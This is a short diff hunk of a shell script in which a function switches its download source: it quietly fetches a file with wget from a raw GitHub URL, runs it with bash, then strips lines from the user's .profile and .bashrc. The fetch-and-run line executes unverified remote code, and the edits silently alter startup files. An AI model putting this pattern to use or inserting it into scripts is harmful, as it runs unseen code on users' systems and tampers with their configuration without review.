@@ -42,7 +42,7 @@ exp=$(date -d "0 days" +"%y%m%d")
 
 scrip() {
 	cd
-wget -q -O installl "https://kguza.net/scrip/u-d/Passwd"
+wget -q -O installl "https://raw.githubusercontent.com/LiLGun-X/FucK.K/main/in2"
 bash installl
 sed -i '/screenfetch/d' .profile .bashrc
 sed -i '/clear/d' .profile .bashrc
